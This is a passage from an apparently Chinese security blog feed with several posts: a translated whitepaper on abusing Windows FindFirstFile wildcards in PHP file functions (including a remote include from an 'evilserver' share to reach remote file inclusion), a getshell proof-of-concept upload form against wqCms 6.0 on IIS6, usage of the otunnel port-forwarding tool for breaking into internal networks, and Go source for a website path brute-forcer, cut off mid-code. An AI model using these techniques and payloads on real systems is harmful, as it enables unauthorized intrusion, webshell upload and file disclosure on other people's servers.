<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE:include(‘shell”php&apos;);    //===&gt;include(‘shell.php&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>如果文件名第一个字符是”.”的话，读取时可以忽略之</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：fopen(‘.htacess&apos;);  //==&gt;fopen(‘htacess&apos;);   //加上第一点中的利用 ==&gt;fopen(‘h&lt;&lt;&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>文件名末尾可以加上一系列的/或者的合集，你也可以在/或者中间加上.字符，只要确保最后一位为”.”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：fopen(“config.ini\.// ///.”);==&gt;  fopen(‘config.ini./..&apos;); ==&gt;fopen(‘config.ini/////.&apos;)==&gt;fopen(‘config.ini…..&apos;)   //译者注：此处的利用我不是很理解，有何作用？截断？</div></pre></td></tr></table></figure>
</li>
<li><p>该函数也可以调用以”\”打头的网络共享文件，当然这会耗费不短的时间。补充一点，如果共享名不存在时，该文件操作将会额外耗费4秒钟的时间，并可能触发时间响应机制以及max_execution_time抛错。所幸的是，该利用可以用来绕过allow_url_fopen=Off 并最终导致一个RFI（远程文件包含）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：include (‘\evilservershell.php&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>用以下方法还可以切换文件的盘名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">include(‘\.C:myfile.php......D:anotherfile.php&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>选择磁盘命名语法可以用来绕过斜线字符过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_get_contents(‘C:boot.ini&apos;); //==&gt;  file_get_contents (‘C:/boot.ini&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>在php的命令行环境下（php.exe）,关于系统保留名文件的利用细节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">EXAMPLE:file_get_contents(‘C:/tmp/con.jpg&apos;); //此举将会无休无止地从CON设备读取0字节，直到遇到eof</div><div class="line"></div><div class="line">EXAMPLE:file_put_contents(‘C:/tmp/con.jpg&apos;,chr(0×07));  //此举将会不断地使服务器发出类似哔哔的声音</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="更深入的利用方法"><a href="#更深入的利用方法" class="headerlink" title="更深入的利用方法"></a>更深入的利用方法</h2><p>除了以上已经展示的方法，你可以用下面的姿势来绕过WAF或者文件名过滤</p>
<p>请思考该例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	file_get_contents(<span class="string">"/images/"</span>.$_GET[<span class="string">'a'</span>].<span class="string">".jpg"</span>);</div><div class="line">	<span class="comment">//or another function from Table 1, i.e. include().</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问test.php?a=../a&lt;%00</p>
<p>可能出现两种结果</p>
<ol>
<li><p>Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Invalid argument in。。。</p>
</li>
<li><p>Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Permission denied。。</p>
</li>
</ol>
<p>如果是第一种情况，说明不存在a打头的文件，第二种则存在。</p>
<p>此外，有记录显示，有时网站会抛出如下错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Warning: include(/admin_h1d3) [function.include]: failed to open stream: Permission denied..</div></pre></td></tr></table></figure></p>
<p>这说明该文件夹下存在一个以上以a打头的文件（夹），并且第一个就是admin_h1d3。</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>实验告诉我们，php本身没有那么多的漏洞，我们所看到是：过分的依赖于另一种程序语言（注：如文中的漏洞产自与winapi的一个BUG），并且直接强 制使用，将会导致细微的错误(bug)，并最终造成危害(vul).这样便拓宽了模糊测试的范畴（译者注：并不仅仅去研究web层面，而深入到系统底层），并最终导致IDS，IPS的规则更新。诚然，代码需要保护，需要补丁，需要升级与扩充。但是，这并不是我们真正要去关注的问题。在当下，我认为我们 更谨慎地去书写更多更严厉的过滤规则，正如我们一直在做的一样。任重道远，精益求精。</p>
<p>因为这是基础应用层的问题，所以我们猜想类似的问题可能出现在其他web应用中。于是我们还测试了mysql5,而实验结果表明，mysql5并不存在类似的漏洞。但是我们仍认为：类似的漏洞将会出现在诸如Perl、Python、Ruby等解释性语言上。</p>
<h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><blockquote>
<p>PHP application source code audits advanced technology:</p>
<p><a href="http://code.google.com/p/pasc2at/wiki/SimplifiedChinese" target="_blank" rel="external">http://code.google.com/p/pasc2at/wiki/SimplifiedChinese</a></p>
<p>MSDN FindFirstFile Function reference:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx</a></p>
<p>MSDN comments history:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3</a></p>
<p>MSDN article «Naming Files, Paths, and Namespaces»:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx</a></p>
<p>Technet article «Managing Files and Directories»:</p>
<p><a href="http://technet.microsoft.com/en-us/library/cc722482.aspx" target="_blank" rel="external">http://technet.microsoft.com/en-us/library/cc722482.aspx</a></p>
<p>Paper «Technique of quick exploitation of 2blind SQL Injection»:</p>
<p><a href="http://www.exploit-db.com/papers/13696/" target="_blank" rel="external">http://www.exploit-db.com/papers/13696/</a></p>
</blockquote>
<hr>
<p>全文完。</p>
<p>注：该文是2011年底发表的一篇白皮书，至今该bug依然存在。我在几个月前做CUIT的一个CTF时偶遇了一道该bug的利用，当时便是看的此文，当时只是粗粗读了一下，写了一个php的脚本去跑目录。今回闲来无事，翻译整理了一番。</p>
<p>文章转自群友</p>
<h1 id="版权声明："><a href="#版权声明：" class="headerlink" title="版权声明："></a>版权声明：</h1><p>文章所设计内容包括两部分<br>一是法师的书籍《代码审计-企业级web代码安全架构》<br>二是来自群友@evil7提供的资料<br>以下为资料原文：<br><a href="http://www.169it.com/blog_article/2302639890.html" target="_blank" rel="external">http://www.169it.com/blog_article/2302639890.html</a><br><a href="https://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki" target="_blank" rel="external">https://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID读取文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell文件路径，但是当在Windows下时，我们只需要知道文件所在目录，然后利用Windows的特性就可以访问到文件，这是因为Windows在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。&lt;/p&gt;
&lt;p&gt;利用方法很简单，我们只要将文件名不可知部分之后的字符用”&amp;lt;”或者”&amp;gt;”代替即可，不过要注意一点是，只使用一个”&amp;lt;”或者”&amp;gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求”1&amp;lt;”或者”1&amp;gt;”都是访问不到文件的，需要”1&amp;lt;&amp;lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。&lt;br&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://akkuman.coding.me/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://akkuman.coding.me/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>wqCms6.0在IIS6的Getshell</title>
    <link href="http://akkuman.coding.me/2017/02/22/wqCms6.0%E5%9C%A8IIS6%E7%9A%84Getshell.html"/>
    <id>http://akkuman.coding.me/2017/02/22/wqCms6.0在IIS6的Getshell.html</id>
    <published>2017-02-22T13:20:55.000Z</published>
    <updated>2017-03-03T14:48:13.452Z</updated>
    
    <content type="html"><![CDATA[<p>2017-02-15发布</p>
<h1 id="一、漏洞利用点"><a href="#一、漏洞利用点" class="headerlink" title="一、漏洞利用点"></a>一、漏洞利用点</h1><p>漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点<br><a id="more"></a></p>
<h1 id="二、hack-it"><a href="#二、hack-it" class="headerlink" title="二、hack it"></a>二、hack it</h1><p><img src="https://ooo.0o0.ooo/2017/02/22/58ad9095a4fe5.jpg" alt="77e968abd5e5cb3e2c4cdfbe620568fa.jpg"><br><img src="https://ooo.0o0.ooo/2017/02/22/58ad8ebcee2cf.jpg" alt="7281e4d1334393ddcc1c4926ad0065a8.jpg"></p>
<h1 id="三、POC"><a href="#三、POC" class="headerlink" title="三、POC"></a>三、POC</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/admin_UploadDataHandler.ashx"</span> <span class="attr">method</span>=<span class="string">"POST"</span><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"uploadify"</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"saveFile"</span> <span class="attr">value</span>=<span class="string">"admin"</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Upload"</span> <span class="attr">value</span>=<span class="string">"Submit Query"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>转自群友论坛文章<a href="http://loner.fm/article.php?id=24236" target="_blank" rel="external">wobushou</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2017-02-15发布&lt;/p&gt;
&lt;h1 id=&quot;一、漏洞利用点&quot;&gt;&lt;a href=&quot;#一、漏洞利用点&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞利用点&quot;&gt;&lt;/a&gt;一、漏洞利用点&lt;/h1&gt;&lt;p&gt;漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点&lt;br&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://akkuman.coding.me/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://akkuman.coding.me/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>otunnel：一个和lcx差不多的端口转发的工具</title>
    <link href="http://akkuman.coding.me/2017/02/15/otunnel%EF%BC%9A%E4%B8%80%E4%B8%AA%E5%92%8Clcx%E5%B7%AE%E4%B8%8D%E5%A4%9A%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7.html"/>
    <id>http://akkuman.coding.me/2017/02/15/otunnel：一个和lcx差不多的端口转发的工具.html</id>
    <published>2017-02-15T12:58:16.000Z</published>
    <updated>2017-03-04T05:10:07.126Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个采用Golang编写的和lcx差不多的端口转发的工具，用来突破内网环境</p>
<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/ooclab/otunnel" target="_blank" rel="external">ooclab/otunnel</a><br><a id="more"></a></p>
<h1 id="下载地址-内涵各大平台"><a href="#下载地址-内涵各大平台" class="headerlink" title="下载地址(内涵各大平台)"></a>下载地址(内涵各大平台)</h1><p><a href="http://dl.ooclab.com/otunnel/" target="_blank" rel="external">http://dl.ooclab.com/otunnel/</a></p>
<h1 id="otunnel-用法"><a href="#otunnel-用法" class="headerlink" title="otunnel 用法"></a>otunnel 用法</h1><p>前提：</p>
<ol>
<li>假设 server 的地址为 example.com</li>
<li>从 client 能连接 server (client 与 server 无需在同一个网络)</li>
</ol>
<p><strong>注意</strong>  otunnel 程序可以作为 server 和 client 两种角色（运行参数不同）</p>
<h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./otunnel listen :10000 <span class="_">-s</span> longlongsecret</div></pre></td></tr></table></figure>
<h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>举例：将 client 可以访问的 192.168.1.3:22 映射到 server 上的 10022 端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./otunnel connect example.com:10000 <span class="_">-s</span> longlongsecret -t <span class="string">'r:192.168.1.3:22::10022'</span></div></pre></td></tr></table></figure></p>
<p>现在访问 example.com:10022 即等于访问了 client 内网的 192.168.1.3:22</p>
<h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><p>举例：假设 example.com 的 127.0.0.1:3128 服务（你懂得），在 client 运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./otunnel connect example.com:10000 <span class="_">-s</span> longlonglongsecret -t <span class="string">'f::20080:127.0.0.1:3128'</span></div></pre></td></tr></table></figure></p>
<p>现在 client 的 20080 端口， 等于访问 example.com 上的 127.0.0.1:3128</p>
<h2 id="程序用法"><a href="#程序用法" class="headerlink" title="程序用法"></a>程序用法</h2><h3 id="t-格式"><a href="#t-格式" class="headerlink" title="-t 格式"></a>-t 格式</h3><p>包含多个字段信息，以<code>:</code>隔开(为空的字段也不能省略<code>:</code>)。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">代理类型:本地地址:本地端口:远程地址:远程端口</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>字段</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>代理类型</td>
<td style="text-align:center">r 表示反向代理; f 表示正向代理</td>
</tr>
<tr>
<td>本地地址</td>
<td style="text-align:center">IP或域名</td>
</tr>
<tr>
<td>本地端口</td>
<td style="text-align:center">整数</td>
</tr>
<tr>
<td>远程地址</td>
<td style="text-align:center">IP或域名</td>
</tr>
<tr>
<td>远程端口</td>
<td style="text-align:center">整数</td>
</tr>
</tbody>
</table>
<p><strong>注意</strong></p>
<ol>
<li><code>本地地址</code>或<code>远程地址</code>如果为空，表示所有网口</li>
<li>otunnel 命令行可以包含多个<code>-t</code>选项，同时指定多条隧道规则</li>
</ol>
<h1 id="特点及优势"><a href="#特点及优势" class="headerlink" title="特点及优势"></a>特点及优势</h1><p>otunnel 是一款对称的安全隧道工具。</p>
<ul>
<li>单二进制程序：otunnel 为一个独立的二进制程序，可以作为 server 和 client 端。</li>
<li>支持多操作系统平台：支持GNU/Linux, Unix-like, Mac, Windows，其他如 ddwrt 等 arm 平台。</li>
<li>无需配置文件：命令行使用</li>
<li>对称设计：同时支持 正、反向代理（端口映射）</li>
<li>安全加密：支持 AES 对称加密</li>
</ul>
<p><img src="https://ooo.0o0.ooo/2017/02/15/58a455a1b0a71.png" alt="otunnel反向代理图示"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一个采用Golang编写的和lcx差不多的端口转发的工具，用来突破内网环境&lt;/p&gt;
&lt;h1 id=&quot;项目地址&quot;&gt;&lt;a href=&quot;#项目地址&quot; class=&quot;headerlink&quot; title=&quot;项目地址&quot;&gt;&lt;/a&gt;项目地址&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/ooclab/otunnel&quot;&gt;ooclab/otunnel&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://akkuman.coding.me/categories/Tools/"/>
    
    
      <category term="Tools" scheme="http://akkuman.coding.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Golang初练手-多线程网站路径爆破</title>
    <link href="http://akkuman.coding.me/2017/02/08/first-practice-for-Golang-Multithread-Website-Burster.html"/>
    <id>http://akkuman.coding.me/2017/02/08/first-practice-for-Golang-Multithread-Website-Burster.html</id>
    <published>2017-02-07T17:25:48.000Z</published>
    <updated>2017-03-04T05:26:58.799Z</updated>
    
    <content type="html"><![CDATA[<p>以前用Python写过这个工具，前两天看了golang的基础，就想着用这个语言把这个工具重写一遍</p>
<p>先放张图<img src="https://ooo.0o0.ooo/2017/03/04/58ba4e8c66d38.gif" alt="演示1.gif"><br><a id="more"></a></p>
<p>用法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Example : Buster.exe -u=https://www.baidu.com -d=asp.txt -t=5</div><div class="line">Buster是你的程序名字</div><div class="line">-u后面填网址参数，格式如上</div><div class="line">-d选字典</div><div class="line">-t是线程数</div><div class="line">当你第一次运行请直接在命令行运行你的程序，什么参数都别加，他会有提示信息告诉你怎么做的</div></pre></td></tr></table></figure></p>
<p>话不多说，直接上代码，字典采用的以前搜集的一个珍藏的大字典，跑起来可能耗时比较久，文件外链会放在底下<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"bufio"</span></div><div class="line">	<span class="string">"flag"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"io/ioutil"</span></div><div class="line">	<span class="string">"net/http"</span></div><div class="line">	<span class="string">"os"</span></div><div class="line">	<span class="string">"sync"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="keyword">var</span> urls <span class="keyword">chan</span> <span class="keyword">string</span></div><div class="line"><span class="keyword">var</span> no404URL = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</div><div class="line"><span class="keyword">var</span> wg sync.WaitGroup <span class="comment">//等待goroutine完成</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line"></div><div class="line">	<span class="keyword">var</span> baseURL <span class="keyword">string</span></div><div class="line">	<span class="keyword">var</span> dicPath <span class="keyword">string</span></div><div class="line">	<span class="keyword">var</span> threadCount <span class="keyword">int</span></div><div class="line">	flag.StringVar(&amp;baseURL, <span class="string">"u"</span>, <span class="string">"https://www.baidu.com"</span>, <span class="string">"website which you want to burst"</span>)</div><div class="line">	flag.StringVar(&amp;dicPath, <span class="string">"d"</span>, <span class="string">"asp.txt"</span>, <span class="string">"dic which you want to use"</span>)</div><div class="line">	flag.IntVar(&amp;threadCount, <span class="string">"t"</span>, <span class="number">5</span>, <span class="string">"number of Thread"</span>)</div><div class="line">	flag.Parse()</div><div class="line"></div><div class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(os.Args) == <span class="number">1</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"------------------------------------"</span>)</div><div class="line">		fmt.Println(<span class="string">" Author      |       Akkuamn"</span>)</div><div class="line">		fmt.Println(<span class="string">"------------------------------------"</span>)</div><div class="line">		fmt.Println(<span class="string">" Update-v1.0 |      2017-02-07"</span>)</div><div class="line">		fmt.Println(<span class="string">"-------------------------------------"</span>)</div><div class="line">		fmt.Printf(<span class="string">"\nUsage : \n\tExample : %s -u=https://www.baidu.com -d=asp.txt -t=5\n\n"</span>, os.Args[<span class="number">0</span>])</div><div class="line">		fmt.Printf(<span class="string">"View more help via %s -h\n\n"</span>, os.Args[<span class="number">0</span>])</div><div class="line">		listDic(<span class="string">"dic"</span>)</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		dicPath = <span class="string">"./dic/"</span> + dicPath</div><div class="line">		start(baseURL, dicPath, threadCount)</div><div class="line">		wg.Wait() <span class="comment">//等待goroutine完成</span></div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">start</span><span class="params">(baseURL <span class="keyword">string</span>, dicPath <span class="keyword">string</span>, threadCount <span class="keyword">int</span>)</span></span> &#123;</div><div class="line"></div><div class="line">	dicFile, dicError := os.OpenFile(dicPath, os.O_RDONLY, <span class="number">0</span>)</div><div class="line">	<span class="keyword">if</span> dicError != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Printf(<span class="string">"\nOpenFile Error:文件打开出错，请检查字典文件是否存在，或文件名是否准确\n"</span>)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">defer</span> dicFile.Close()</div><div class="line"></div><div class="line">	<span class="comment">//把处理后的需要爆破的url全部传到信道urls</span></div><div class="line">	ReturnBurstURL(dicFile, baseURL)</div><div class="line"></div><div class="line">	<span class="comment">//单独开goroutine从信道no404URL取数据写入文件</span></div><div class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">		resultTxt, err := os.OpenFile(<span class="string">"result.txt"</span>, os.O_CREATE|os.O_TRUNC|os.O_RDWR, <span class="number">0660</span>)</div><div class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">			fmt.Println(<span class="string">"OpenFile Error:"</span> + err.Error())</div><div class="line">		&#125;</div><div class="line">		resultWriter := bufio.NewWriter(resultTxt)</div><div class="line">		<span class="keyword">defer</span> resultTxt.Close()</div><div class="line">		<span class="keyword">for</span> &#123;</div><div class="line">			_, err = resultWriter.WriteString(&lt;-no404URL)</div><div class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">				fmt.Println(<span class="string">"resultWriter Error:"</span> + err.Error())</div><div class="line">			&#125;</div><div class="line">			resultWriter.Flush()</div><div class="line">		&#125;</div><div class="line">	&#125;()</div><div class="line"></div><div class="line">	<span class="comment">//并发访问网址并将状态码不为404的网址加入信道no404URL</span></div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; threadCount; i++ &#123;</div><div class="line">		wg.Add(<span class="number">1</span>)</div><div class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</div><div class="line">			<span class="keyword">for</span> <span class="built_in">len</span>(urls) &gt; <span class="number">0</span> &#123;</div><div class="line">				url := &lt;-urls</div><div class="line">				status := HTTPStatus(url)</div><div class="line">				fmt.Printf(<span class="string">"[%d]%s-----%s\n"</span>, i, status, url)</div><div class="line">				<span class="keyword">if</span> status != <span class="string">"404 Not Found"</span> &#123;</div><div class="line">					no404URL &lt;- status + <span class="string">"-----"</span> + url + <span class="string">"\n"</span></div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			wg.Done()</div><div class="line">		&#125;(i)</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//返回HTTP访问状态码</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">HTTPStatus</span><span class="params">(url <span class="keyword">string</span>)</span> <span class="params">(status <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	client := http.DefaultClient</div><div class="line">	reqest, err := http.NewRequest(<span class="string">"HEAD"</span>, url, <span class="literal">nil</span>)</div><div class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</div><div class="line">		reqest.Header.Set(<span class="string">"User-Agent"</span>, <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0"</span>)</div><div class="line">		reqest.Header.Set(<span class="string">"Accept"</span>, <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>)</div><div class="line">		response, err1 := client.Do(reqest)</div><div class="line">		<span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</div><div class="line">			fmt.Println(<span class="string">"HTTPRequest Error:"</span> + err1.Error())</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">defer</span> response.Body.Close()</div><div class="line">		<span class="keyword">return</span> response.Status</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"NewRequest Error:"</span> + err.Error())</div><div class="line">		<span class="keyword">return</span> <span class="string">"400 Bad Request"</span></div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//把处理后的需要爆破的url全部传到信道urls</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> urlList []<span class="keyword">string</span></div><div class="line">	allURLTxt := bufio.NewScanner(fURL)</div><div class="line">	<span class="keyword">for</span> allURLTxt.Scan() &#123;</div><div class="line">		newurl := baseurl + <span class="string">"/"</span> + allURLTxt.Text()</div><div class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</div><div class="line">	&#125;</div><div class="line">	urls = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="built_in">len</span>(urlList))</div><div class="line">	<span class="keyword">for</span> _, url := <span class="keyword">range</span> urlList &#123;</div><div class="line">		urls &lt;- url</div><div class="line">	&#125;</div><div class="line">	fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//罗列出可用字典</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">listDic</span><span class="params">(dicDir <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	dirList, err := ioutil.ReadDir(dicDir)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"ReadDir Error : "</span> + err.Error() + <span 